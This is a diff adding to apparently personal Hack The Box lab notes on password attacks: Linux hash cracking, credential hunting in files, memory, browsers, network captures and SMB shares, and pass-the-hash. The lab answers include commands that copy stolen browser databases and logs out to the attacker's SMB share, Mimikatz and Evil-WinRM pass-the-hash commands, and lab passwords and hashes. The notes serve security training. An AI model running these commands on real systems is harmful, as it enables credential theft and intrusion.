@@ -3053,7 +3053,9 @@ Hash format: `$<id>$<salt>$<hashed>`. The ID identifies the algorithm:
 Modern Debian defaults to yescrypt; older systems may use waker, more crackable algorithms.
 
 ## Opasswd
+
 PAM (`pam_unix.so`) blocks password reuse by storing old passwords in `/etc/security/opasswd` (root-only read):
+
 ```bash
 sudo cat /etc/security/opasswd
 ```
@@ -3061,6 +3063,7 @@ sudo cat /etc/security/opasswd
 Multiple old hashes per user are comma-separated. Note the hash type - MD5 (`$1$`) is far easier to crack than SHA-512. Old passwords reveal reuse patterns, improving your chances of guessing current credentials.
 
 ## Cracking Linux Credentials
+
 With root access, gather hashes and crack them. `unshadow` (bundled with John the Ripper) merges passwd + shadow into one crackable file:
 
 ```bash
@@ -3070,16 +3073,23 @@ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
 ```
 
 Then crack with hashcat (mode `1800` = SHA-512crypt):
+
 ```bash
 hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
 ```
 
 > Note: This scenario is exactly what JtR's single crack mode was designed for.
 
+
+
 ## Key takeaways
+
 `passwd` is world-readable (crackable if hashes leak there), `shadow` is root-only, the `$id$` prefix tells you the algorithm (and how crackable it is), and `opasswd` is a goldmine for spotting password-reuse patterns.
 
 ## Connect to HTB
+
+
+
 #### Download the attached ZIP file (linux-authentication-process.zip), and use single crack mode to find martin's password. What is it?
 
 ```bash
@@ -3160,7 +3170,2204 @@ $6$0XiU8Oe/pGpxWvdq$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/
 Martin1
 ```
 
+
+
 #### Use a wordlist attack to find sarah's password. What is it?
+
 ```bash
 mariposa
 ```
+
+
+
+# Credential Hunting in Linux
+
+Once you have a foothold (e.g., reverse shell from a vulnerable web app), hunting for stored credentials is one of the fastest paths to privilege escalation. Always keep the system's role in mind - an isolated DB server won't have normal users, but will have sensitive config.
+
+## Four Credential Sources
+
+
+
+### 1. Files - the biggest category:
+
+- Config files (`.conf`, `.config`, `.cnf`): Often contain plaintext creds; MySQL configs are classic targets.
+- Databases (`.sql`, `.db`, etc.)
+- Notes: tricky, since they can have anyname or no extension (search `.txt` and extensionless files)
+- Scripts (`.py`, `.sh`, `.pl`, etc.): Frequently hardcode creds for automation
+- Cronjobs (`/etc/crontab`, `/etc/cron.d`, `cron.{daily,hourly,weekly,monthly}`): Creds sometimes wrongly stored here
+- SSH keys
+
+
+
+### 2. History
+
+- `.bash_history`, `.bashrc`, `.bash_profile`: Commands sometimes include passwords typed inline (the example shows a password leaked in bash history)
+- Log files in `/var/log/` -- key ones: `auth.log`/`secure` (auth), `syslog`/`messages` (system), `cron`, `mysqld.log`. Grep for `accepted`, `failed`, `sudo`, `password changed`, etc.
+
+
+
+### 3. Memory / Cache
+
+- mimipenguin: Pulls creds from memory (needs root)
+- LaZagne - broader; extracts from browsers, SSH, keyrings, shadow, Docker, KeePass, WiFi, etc.
+
+
+
+### 4. Key-rings - OS-based encrypted password storage (master-password protected)
+
+
+
+## Browser Credentials
+
+Firefox stores encrypted creds in `logins.json` inside the profile folder (`.mozilla/firefox/*.default-release/`). Encryption != safety:
+
+- Firefox Decrypt (needs Python 3.9) decrypts them
+- LaZagne (`browsers` module) ins the alternative
+
+
+
+## Key Takeaways
+
+The whole module boils down to a search methodology: enumerate systematically by category rather than guessing. The `for` loops that iterate over extension lists and pipe through `grep -v` to filter noise (`lib`, `share`, `doc`, `fonts`) are the reusable pattern worth saving. They generalize to almost any file-hunt scenario.
+
+## Commands
+
+
+
+### Config files (`.conf`, `.config`, `.cnf`)
+
+Find all config files (filtering noise):
+
+```bash
+for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+```
+
+Grep configs directly for creds:
+
+```bash
+for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
+```
+
+
+
+### Databases (`.sql`, `.db`, etc.)
+
+```bash
+for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
+```
+
+
+
+### Notes (`.txt` + extensionless files)
+
+```bash
+find /home/* -type f -name "*.txt" -o ! -name "*.*"
+```
+
+
+
+### Scripts (`.py`, `.pyc`, `.pl`, `.go`, `.jar`, `.c`, `.sh`)
+
+```bash
+for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+```
+
+
+
+### Cronjobs
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron.*/
+```
+
+System-wide: `/etc/crontab`, `/etc/cron.d/` (Debian). Time-based dirs: `cron.{hourly,daily,weekly,monthly}`.
+
+## History
+
+
+
+### Bash history & profile files
+
+```bash
+tail -n5 /home/*/.bash*
+```
+
+Check `.bash_history`, `.bashrc`, `.bash_profile` — passwords sometimes typed inline.
+
+### Log files
+
+```bash
+for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
+```
+
+**Key log files:**
+
+
+| File                                                    | Description             |
+| ------------------------------------------------------- | ----------------------- |
+| `/var/log/messages`, `/var/log/syslog`                  | Generic system activity |
+| `/var/log/auth.log` (Debian) / `/var/log/secure` (RHEL) | Authentication          |
+| `/var/log/faillog`                                      | Failed logins           |
+| `/var/log/cron`                                         | Cron jobs               |
+| `/var/log/mail.log`                                     | Mail server             |
+| `/var/log/httpd`                                        | Apache                  |
+| `/var/log/mysqld.log`                                   | MySQL                   |
+
+
+
+
+## Memory & Cache
+
+
+
+### mimipenguin (needs root)
+
+```bash
+sudo python3 mimipenguin.py
+```
+
+
+
+### LaZagne (broader coverage)
+
+```bash
+sudo python2.7 laZagne.py all      # everything
+python3 laZagne.py browsers        # browsers only
+```
+
+Sources: WiFi, wpa_supplicant, libsecret, kwallet, Chromium, Mozilla, Thunderbird, Git, ENV vars, Grub, Fstab, AWS, Filezilla, SSH, Apache, shadow, Docker, KeePass, keyrings, sessions.
+
+## Browser credentials (Firefox)
+
+Locate profile:
+
+```bash
+ls -l .mozilla/firefox/ | grep default
+```
+
+Encrypted creds live in `logins.json`:
+
+```bash
+cat .mozilla/firefox/<profile>.default-release/logins.json | jq .
+```
+
+Decrypt with **Firefox Decrypt** (needs Python 3.9; use v0.7.0 for Python 2):
+
+```bash
+python3.9 firefox_decrypt.py
+```
+
+Or via LaZagne (`browsers` module above).
+
+## Connect to HTB
+
+
+
+#### Examine the target and find out the password of the user Will. Then, submit the password as the answer.
+
+On Ubuntu
+
+```bash
+mkdir ~/firefox_loot
+
+source venv/bin/activate
+sudo $(which smbserver.py) -smb2support CompData /home/mapacheroja22/
+```
+
+On Server
+
+```bash
+smbclient //10.10.17.216/CompData -c "put cert9.db"
+```
+
+On Ubuntu
+
+```bash
+mv ~/key4.db ~/logins.json ~/cert9.db ~/firefox_loot/ 2>/dev/null
+
+sudo chown mapacheroja22:mapacheroja22 ~/cert9.db
+mv ~/cert9.db ~/firefox_loot/
+python3 firefox_decrypt/firefox_decrypt.py ~/firefox_loot/
+
+Website:   https://dev.inlanefreight.com
+Username: 'will@inlanefreight.htb'
+Password: 'TUqr7QfLTLhruhVbCP'
+```
+
+
+
+# Credential Hunting in Network Traffic
+
+When traffic isn't encrypted (legacy systems, misconfigured services, test apps running plain HTTP) credentials travel in cleartext and can be sniffed. The section covers finding those creds in captures/live traffic with Wireshark and Pcredz.
+
+## Plaintext vs Encrypted Protocols
+
+Every common protocol has a secure counterpart; the plaintext version is what you hunt in:
+
+- `HTTP -> HTTPS`
+- `FTP -> FTPS/SFTP`
+- `SNMP -> SNMPv3`
+- `POP3 -> POP3S`
+- `IMAP -> IMAPS`
+- `SMTP -> SMTPS`
+- `LDAP -> LDAPS`
+- `RDP` (-> TLS)
+- `DNS -> DoH`
+- `SMB -> SMB 3.0/TLS`
+- `VNC -> VNC+TLS`
+
+
+
+## Wireshark
+
+
+
+### Useful display filters
+
+
+| Filter                                            | Purpose                                      |
+| ------------------------------------------------- | -------------------------------------------- |
+| `ip.addr == 56.48.210.13`                         | Specific IP                                  |
+| `tcp.port == 80`                                  | By port                                      |
+| `http`                                            | HTTP traffic                                 |
+| `dns`                                             | DNS traffic                                  |
+| `tcp.flags.syn == 1 && tcp.flags.ack == 0`        | SYN packets (scans/connection attempts)      |
+| `icmp`                                            | Ping / recon                                 |
+| `http.request.method == "POST"`                   | POST requests — often carry login form creds |
+| `tcp.stream eq 53`                                | Follow one TCP conversation                  |
+| `eth.addr == 00:11:22:33:44:55`                   | By MAC                                       |
+| `ip.src == 192.168.24.3 && ip.dst == 56.48.210.3` | Traffic between two hosts                    |
+
+
+
+
+### Searching packet contents for string
+
+- Display filter: `http contains "passw"`
+- Or Edit > Find Packet, enter a search string like `passw`
+
+
+
+## Pcredz
+
+Auto-extracts creds from a pcap or live interface. Pulls: credit card numbers, POP/SMTP/IMAP creds, SNMP community string, FTP creds, HTTP NTLM/Basic + form creds, NTLMv1/v2 hashes (DCE-RPC, SMBv1/2, LDAP, MSSQL, HTTP), and Kerberos AS-REQ (etype 23) hashes.
+
+Run against a capture file: 
+
+```bash
+./Pcredz -f demo.pcapng -t -v
+```
+
+`-f`=file, `-t`=TCPDump format handling, `-v`=verbose. In the sample output it caught an SNMPv2 community string and FTP User/Pass in seconds.
+
+## Connect to HTB
+
+
+
+#### The packet capture contains cleartext credit card information. What is the number that was transmitted?
+
+```bash
+git clone https://github.com/lgandx/PCredz.git
+
+source venv/bin/activate
+pip3 install pcapy-ng
+
+cd PCredz
+./Pcredz -f ../Desktop/demo.pcapng -t -v
+
+Author: Laurent Gaffie
+Contact: lgaffie@secorizon.com
+X: @secorizon
+
+CC number scanning activated
+
+Parsing ../Desktop/demo.pcapng...
+[2026-07-22 10:14:06.569223] 192.168.31.243:55692 > 192.168.31.238:80
+Potential password submission:
+Request: username=jbenito&password=Password987%21
+
+[2026-07-22 10:14:06.998893] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999046] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999100] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999152] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999193] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999231] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999285] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999341] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999394] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999450] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999507] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999563] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999618] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999691] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999763] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999842] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999919] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:06.999989] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000061] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000132] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000206] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000277] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000349] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000423] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000497] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000569] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000641] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000692] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000763] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000836] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000906] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.000976] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001050] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001127] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001198] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001269] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001344] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001413] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001493] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001562] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001639] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001705] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001775] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001853] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001919] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.001976] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002032] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002093] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002149] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002209] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002264] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002324] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002379] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002442] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002496] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002554] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002624] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002676] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002722] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002775] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002823] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002880] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002941] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.002981] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.003023] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.003063] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.003110] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.003150] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.003189] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.003228] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.003267] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.003307] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.003345] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.003385] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.003423] 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.003462] 192.168.31.238:161 > 192.168.31.211:59022
+Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty
+
+[2026-07-22 10:14:07.024718] 192.168.31.243:55707 > 192.168.31.211:21
+FTP User: leah
+
+[2026-07-22 10:14:07.025457] 192.168.31.243:55707 > 192.168.31.211:21
+FTP Pass: qwerty123
+
+# Inside of Wireshark:
+http.request.method == "POST"
+5156 8829 4478 9834
+
+```
+
+
+
+#### What is the SNMPv2 community string that was used?
+
+```bash
+s3cr3tSNMPC0mmun1ty
+```
+
+
+
+#### What is the password of the user who logged into FTP?
+
+```bash
+qwerty123
+```
+
+
+
+#### What file did the user download over FTP?
+
+```bash
+# In Wireshark
+ftp
+
+10756	82.739862760	192.168.31.243	192.168.31.211	FTP	70	Request: RETR creds.txt
+```
+
+
+
+# Credential Hunting in Network Shares
+
+Corporate SMB shares are a gold mine: employees leave plaintext creds, config files, and secrets lying around. This section covers automating the hunt from both Windows and Linux. 
+
+## What to Look For
+
+- Keywords in files: `passw`, `user`, `token`, `key`, `secret`
+- Extensions: `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, `.bat`
+- Interesting filenames: containing `config`, `user`, `passw`, `cred`, `initial`
+- Domain-specific: search for `INLANEFREIGHT\` to catch domain-qualified references
+- Localize keywords to the target (German company -> `Benutzer`, not `User`)
+- Be strategic: IT shares > company-photo shares. Scanning thousands of files across ten shares eats time.
+
+Start simple before scaling up:
+
+```powershell
+Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern ...
+```
+
+
+
+## Hunting from Windows
+
+
+
+### Snaffler
+
+C# tool, run on a domain.joined machine; auto-finds readable shares and flags interesting files (color-coded by severity: `{Red}` = highest interest, e.g. the `unattend.xml` with an AdministratorPassword it caught):
+
+```cmd
+Snaffler.exe -s
+```
+
+Useful flags: `-u` (pull AD users and search for references to them), `-i`/`-n` (include/specify which shares to scan). Expect false positives, manual review needed.
+
+### PowerHuntShares
+
+PowerShell, doesn't need a domain-joined machine, generates an HTML report with a severity-ranked UI:
+
+```powershell
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
+```
+
+Enumerates computes -> checks 445 -> maps shares + permissions -> flags excessive-privilege/high-risk shares -> builds HTML + CSV output
+
+## Hunting from Linux
+
+
+
+### MANSPIDER
+
+Scans SMB shares remotely; run via Docker to dodge dependency issues
+
+```bash
+docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
+```
+
+`-c` = content string, `-u`/`-p` = creds. Matches download to `.manspider/loot`.
+
+### NetExec (`nxc`)
+
+`--spider` searches shares by content
+
+```bash
+nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
+```
+
+`--spider IT` = target the IT share, `--content` = search inside files, `--pattern` = the string.
+
+## Connect to HTB
+
+
+
+#### One of the shares mendres has access to contains valid credentials of another domain user. What is their password?
+
+```bash
+sudo $(which smbserver.py) -smb2support -username mendres -password 'Inlanefreight2025!' CompData /home/mapacheroja22/
+
+xfreerdp /v:10.129.234.173 /u:mendres /p:Inlanefreight2025!
+```
+
+```pwsh
+cd ..
+cd Public
+Snaffler.exe -s
+
+net use \\10.10.17.216\CompData /user:mendres 'Inlanefreight2025!'
+copy C:\Users\Public\snaffler.log \\10.10.17.216\CompData\
+
+                                                                                                                        PS C:\Users\Public\PowerHuntShares> Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT -ErrorAction SilentlyContinue | Select-String -Pattern "INLANEFREIGHT\\" -ErrorAction SilentlyContinue
+\\DC01.inlanefreight.local\IT\Tools\split_tunnel.txt:5: # Auth backup password: INLANEFREIGHT\jbader:ILovePower333###                                                                                         
+
+```
+
+```powershell
+nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' --shares
+nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' --spider HR --content --pattern "Administrator"
+```
+
+```bash
+smbclient //10.129.234.173/HR -U jbader%'ILovePower333###' -c 'get Confidential\Onboarding_Docs_132.txt'
+
+cat Confidential\\Onboarding_Docs_132.txt
+Account credentials
+**Username:** `Administrator`  
+**Password:** `Str0ng_Adm1nistrat0r_P@ssword_2025!`  
+```
+
+
+
+# Pass the Hash (PtH)
+
+It is a technique where you authenticate using an NTLM password hash directly, without ever cracking it to plaintext. It works because NTLM hashes are unsalted and stay static until the password changes, so the hash itself is a valid credential.
+
+## Prerequisites and how hashes are obtained
+
+You need administrative or specific privileges on the target first. Hashes come from dumping the local SAM database, extracting from `ntds.dit` on a Domain Controller, or pulling from LSASS memory. 
+
+## Windows tools
+
+Mimikatz uses the `sekurlsa::pth` module to spawn a process (default `cmd.exe`) in the impersonated user's context, taking `/user`, `/rc4` (or `/NTLM`), `/domain`, and `/run`. Invoke-TheHash is a PowerShell collection doing PtH over SMB (`Invoke-SMBExec`) or WMI (`Invoke-WMIExec`) via .NET TCPClient and NTLMv2. You don't need local admin client-side, but the account/hash must have admin rights on the target. Examples include creating a new admin user and delivering a base64 PowerShell reverse shell.
+
+## Linux tools
+
+Impacket's `psexec` (plus `wmiexec`, `atexec`, `smbexec`) runs commands with `-hashes :NTLM`. NetExec authenticates across whole subnets to find where a hash grants local admin (`Pwn3d!`), useful for spotting local admin password reuse -- with `--local-auth` and `-x` for command execution. The real-world fix recommended here is deploying LAPS. Evil-WinRM (`-H` flag) is the fallback over WinRM/PowerShell remoting when SMB is blocked. Xfreerdp (`/pth`) gives GUI access but requires Restricted Admin Mode enabled via the `DisableRestrictedAdmin` registry key.
+
+## The UAC caveat (worth understanding, not just memorizing)
+
+`LocalAccountTokenFilterPolicy` = 0 means only the RID-500 built-in Administrator can do remote admin; setting it to 1 allows other local admins. Exception: if `FilterAdministratorToken` = 1, even RID-500 gets caight by UAC and remote PtH fails. Critically, these restrictions only apply to local accounts. Domain accounts with admin rights bypass the whole problem.
+
+## Commands
+
+
+
+### Windows: Mimikatz
+
+```cmd
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:<NTLM_HASH> /domain:inlanefreight.htb /run:cmd.exe" exit
+```
+
+
+
+### Windows: Invoke-TheHash (SMB/WMI)
+
+```powershell
+Import-Module .\Invoke-TheHash.psd1
+Invoke-SMBExec -Target <IP> -Domain <domain> -Username julio -Hash <NTLM_HASH> -Command "<cmd>" -Verbose
+Invoke-WMIExec -Target <host> -Domain <domain> -Username julio -Hash <NTLM_HASH> -Command "<cmd>"
+```
+
+
+
+### Linux: Impacket
+
+```bash
+impacket-psexec administrator@<IP> -hashes :<NTLM_HASH>
+```
+
+(same syntax works with impacket-wmiexec, impacket-atexec, impacket-smbexec)
+
+### Linux: NetExec
+
+```bash
+netexec smb <IP/CIDR> -u Administrator -d . -H <NTLM_HASH>          # spray / check for Pwn3d!
+netexec smb <IP> -u Administrator -d . -H <NTLM_HASH> -x whoami     # command exec
+```
+
+Add `--local-auth` for local-account authentication across a subnet.
+
+### Linux: Evil-WinRM
+
+```bash
+evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
+```
+
+
+
+### Linux: RDP (xfreerdp)
+
+```bash
+xfreerdp /v:<IP> /u:julio /pth:<NTLM_HASH>
+```
+
+Requires Restricted Admin Mode on the target first:
+
+```cmd
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+
+
+## Connect to HTB
+
+
+
+#### Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.
+
+```bash
+evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+
+cd ..
+cd ..
+cd ..
+dir
+
+more pth.txt
